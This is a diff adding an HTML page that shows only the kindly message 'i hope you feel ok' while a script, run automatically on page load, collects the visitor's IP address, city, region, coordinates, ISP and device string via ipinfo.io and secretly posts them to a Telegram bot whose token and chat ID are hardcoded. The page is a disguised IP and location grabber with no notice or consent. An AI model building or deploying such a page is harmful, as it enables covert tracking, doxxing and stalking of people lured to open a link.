@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Info</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="message">i hope you feel ok🤍</div>
+
+    <script>
+        async function getDeviceInfo() {
+            const deviceInfo = navigator.userAgent;
+            const response = await fetch('https://ipinfo.io/json?token=6fdfcd8ec87904');
+            const data = await response.json();
+
+            const info = {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                loc: data.loc,
+                org: data.org,
+                device: deviceInfo
+            };
+
+            return info;
+        }
+
+        async function sendToTelegram(info) {
+            const botToken = '7396648563:AAHcApu4FRLRRbVVk3dBiMwrhPxq5MuAL_w';
+            const chatId = '1801208219';
+            const message = `
+                IP: ${info.ip}
+                City: ${info.city}
+                Region: ${info.region}
+                Country: ${info.country}
+                Location: ${info.loc}
+                Organization: ${info.org}
+                Device: ${info.device}
+            `;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            const info = await getDeviceInfo();
+            await sendToTelegram(info);
+        });
+    </script>
+</body>
+</html>
